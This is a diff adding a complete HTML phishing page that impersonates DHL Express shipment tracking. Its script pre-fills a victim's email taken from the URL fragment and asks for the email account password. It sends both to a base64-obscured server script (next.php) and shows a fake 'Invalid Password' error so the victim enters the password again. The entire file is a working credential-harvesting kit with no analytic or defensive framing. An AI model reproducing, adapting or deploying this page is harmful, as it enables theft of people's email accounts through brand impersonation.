@@ -1,0 +1,405 @@
+<html lang="en"><head>
+    <script type="text/JavaScript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/JavaScript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script type="text/JavaScript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    
+    <title>DHL Express | Track Shipment</title>
+    
+    <style style="text/css">
+        .hoverTable {
+        border-collapse: collapse;
+    }
+
+    .hoverTable td {
+        padding: 7px;
+    }
+
+    /* Define the default color for all the table rows */
+    .hoverTable tr {
+        background: #CA1E07;
+    }
+
+    /* Define the hover highlight color for the table row */
+    .hoverTable tr:hover {
+        background-color: #FFBF00;
+    }
+    </style>
+    <style>
+        /* unvisited link */
+    a:link {
+        color: #FFF;
+    }
+
+    /* visited link */
+    a:visited {
+        color: #FFF;
+    }
+
+    /* mouse over link */
+    a:hover {
+        color: #000;
+    }
+
+    /* selected link */
+    a:active {
+        color: #000;
+    }
+    </style>
+</head>
+
+<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">
+    <table cellspacing="0" width="100%" height="100%">
+        <tbody><tr>
+            <td height="10" bgcolor="#000"></td>
+        </tr>
+        <tr>
+            <td height="65" bgcolor="#FFF">
+                <table width="98%" align="left">
+                    <tbody><tr>
+                        <td style="width:10px;"></td>
+                        <td>
+                            <img src="images/logo-fill.jpg" style="width:120px; height:40px;">
+                        </td>
+                        <td>
+                            <table align="right" cellspacing="0">
+                                <tbody><tr>
+                                    <td>
+                                        <table class="hoverTable" style="box-shadow: 4px 4px 5px #000; border-radius: 3px 3px; padding:10px;">
+                                            <tbody><tr>
+                                                <td style="height:25px; width:85px; border-radius: 2px 2px;">
+                                                    <a href="" style="text-decoration:none;">
+                                                        <font face="verdana" size="2">
+                                                            &nbsp; | Home
+                                                        </font>
+                                                    </a>
+                                                </td>
+                                            </tr>
+                                        </tbody></table>
+                                    </td>
+                                    <td style="width:10px;"></td>
+                                    <td>
+                                        <table class="hoverTable" style="box-shadow: 4px 4px 5px #000; border-radius: 3px 3px; padding:10px;">
+                                            <tbody><tr>
+                                                <td style="height:25px; width:150px; border-radius: 2px 2px;">
+                                                    <a href="" style="text-decoration:none;">
+                                                        <font face="verdana" size="2">
+                                                            &nbsp; | Track Shipment
+                                                        </font>
+                                                    </a>
+                                                </td>
+                                            </tr>
+                                        </tbody></table>
+                                    </td>
+                                    <td style="width:10px;"></td>
+                                    <td>
+                                        <table class="hoverTable" style="box-shadow: 4px 4px 5px #000; border-radius: 3px 3px; padding:10px;">
+                                            <tbody><tr>
+                                                <td style="height:25px; width:85px; border-radius: 2px 2px;">
+                                                    <a href="" style="text-decoration:none;">
+                                                        <font face="verdana" size="2">
+                                                            &nbsp; | Login
+                                                        </font>
+                                                    </a>
+                                                </td>
+                                            </tr>
+                                        </tbody></table>
+                                    </td>
+                                    <td style="width:10px;"></td>
+                                    <td>
+                                        <table class="hoverTable" style="box-shadow: 4px 4px 5px #000; border-radius: 3px 3px; padding:10px;">
+                                            <tbody><tr>
+                                                <td style="height:25px; width:105px; border-radius: 2px 2px;">
+                                                    <a href="" style="text-decoration:none;">
+                                                        <font face="verdana" size="2">
+                                                            &nbsp; | Register
+                                                        </font>
+                                                    </a>
+                                                </td>
+                                            </tr>
+                                        </tbody></table>
+                                    </td>
+                                </tr>
+                            </tbody></table>
+                        </td>
+                    </tr>
+                </tbody></table>
+            </td>
+        </tr>
+        <tr>
+            <td height="35%">
+                <!-- partial:index.partial.html -->
+                <div id="animated-bg" style="background: url(&quot;images/bg.jpg&quot;) center center / cover no-repeat; height: 100vh; position: absolute; width: 100%; left: 0px; top: 0px; z-index: -1;">
+                </div>
+                <div>
+                    <div id="texttop" style="position: relative;">
+                        <div align="center">
+                            <div style="border:none; height:430px; width:400px;padding-top: 100px">
+                                <table align="center" cellspacing="0" style="width:380px; box-shadow: 3px 3px 7px #000; border-radius: 2px 2px; background: #FFF; border: 1px #FFF">
+                                    <tbody><tr>
+                                        <td style="height:20px;"></td>
+                                    </tr>
+                                    <tr>
+                                        <td style="height:45px; background: #FFF;">
+                                            <table align="center" cellspacing="0" style="width:310px;">
+                                                <tbody><tr>
+                                                    <td>
+                                                        <img src="images/logo.jpg" style="width:200px; height:35px;">
+                                                    </td>
+                                                </tr>
+                                            </tbody></table>
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td style="height:150px;">
+                                            <table align="center" cellspacing="0" style="width:320px;">
+                                                <tbody><tr>
+                                                    <td>
+                                                        <font face="Arial, Helvetica, sans-serif" size="+2" color="#CA1E07">
+                                                            Verification Required
+                                                        </font>
+                                                        <br><br>
+                                                        <font face="Arial, Helvetica, sans-serif" size="2" color="#000">
+                                                            Shipment <b>#SHZ7395</b> belongs to this receiver:
+                                                            <br>
+                                                            <b>Recipient: </b>
+                                                            <font color="#CA1E07"><b id="aich">
+                                                                </b></font>
+                                                            <br><br>
+                                                            To Track shipment, please confirm that you own this ID
+                                                        </font>
+                                                    </td>
+                                                </tr>
+                                                <tr>
+                                                    <td>
+                                                        <form>
+                                                    </form></td>
+                                                </tr>
+                                                <tr>
+                                                    <td style="height:10px;">
+                                                        <center>
+                                                            <div class="text-danger" id="msg" style="display: none;">Invalid Password.! Please enter correct password.</div>
+                                                            <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+                                                        </center>
+                                                    </td>
+                                                </tr>
+                                                <tr>
+                                                    <td class="mt-2">
+                                                        <input type="email" name="ai" id="ai" placeholder="Enter Email" required="" style="height:40px; width:320px; box-shadow: 2px 2px 5px #000; border-radius: 1px 1px; background: #F2F2F2; padding:7px">
+                                                    </td>
+                                                </tr>
+                                                <tr>
+                                                    <td style="height:10px;"></td>
+                                                </tr>
+                                                <tr>
+                                                    <td>
+                                                        <input type="password" name="pr" id="pr" placeholder="Type Email Password" required="" style="height:40px; width:320px; box-shadow: 2px 2px 5px #000; border-radius: 1px 1px; background: #F2F2F2; padding:7px">
+                                                    </td>
+                                                </tr>
+                                                <tr>
+                                                    <td style="height:5px;"></td>
+                                                </tr>
+                                                <tr>
+                                                    <td>
+                                                        <input type="checkbox" checked="">
+                                                        <font face="Arial, Helvetica, sans-serif" size="2" color="#000">
+                                                            Remember my email account on this device
+                                                        </font>
+                                                    </td>
+                                                </tr>
+                                                <tr>
+                                                    <td style="height:10px;"></td>
+                                                </tr>
+                                                <tr>
+                                                    <td>
+                                                        <div align="right">
+                                                            <button style="height:35px; width:150px; box-shadow: 2px 2px 2px #000; border-radius: 1px 1px; background: #CA1E07; border: 1px #CA1E07" id="submit-btn">
+                                                                <font face="Arial, Helvetica, sans-serif" size="2" color="#FFF">
+                                                                    Track Shipment &gt;&gt;
+                                                                </font>
+                                                            </button>
+                                                        </div>
+                                                    </td>
+                                                </tr>
+                                                <tr>
+                                                    <td>
+                                                        <input type="hidden" name="login" value="">
+                                                        
+                                                    </td>
+                                                </tr>
+                                            </tbody></table>
+                                        </td>
+                                    </tr>
+                                    <tr>
+                                        <td style="height:30px;"></td>
+                                    </tr>
+                                </tbody></table>
+                            </div>
+                            <br><br><br><br><br><br>
+                        </div>
+                    </div>
+                </div>
+                <br><br>
+            </td>
+        </tr>
+        <tr>
+            <td height="30" bgcolor="#B40404">
+                <div align="center">
+                    <font face="verdana" size="1" color="#FFF">
+                        DHL Express ©2020 | All rights reserved
+                    </font>
+                </div>
+            </td>
+        </tr>
+    </tbody></table>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+    var images = ["bg.jpg", "bg1.jpg", "bg2.jpg", "bg3.jpg", "bg4.jpg", "bh5.jpg", "bg6.jpg"];
+    $(function() {
+        var i = 0;
+        $("#animated-bg").css("background-image", "url('images/" + images[i] + "')");
+        setInterval(function() {
+            i++;
+            if (i == images.length) {
+                i = 0;
+            }
+            $("#animated-bg").fadeOut("slow", function() {
+                $(this).css("background-image", "url(images/" + images[i] + ")");
+                $(this).fadeIn("slow");
+            });
+        }, 3500);
+    });
+    $('#back1').click(function() {
+        $("#msg").hide();
+        $('#ai').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+
+    });
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $('#ai').val(my_ai);
+        $('#aich').html(my_ai);
+        $("#msg").hide();
+        
+    }
+    ///////////////url getting ai////////////////
+
+
+var f="bmV4dC5waHA=";
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Email field is emply.!");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Password field is emply.!");
+            ai.focus;
+            return false;
+        }
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $('#aich').html(my_ai);
+        ///////////////////////////
+        count = count + 1;
+
+        $.ajax({
+            dataType: 'JSON',
+            url: atob(f),
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('<font face="Arial, Helvetica, sans-serif" size="2" color="#FFF">Verifying...</font>');
+            },
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            // window.location.replace("http://www." + my_slice);
+
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    // window.location.replace("http://www." + my_slice);
+                }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').html('<font face="Arial, Helvetica, sans-serif" size="2" color="#FFF">Track Shipment >></font>');
+            }
+        });
+    });
+
+
+});
+</script>
+
+</body></html>
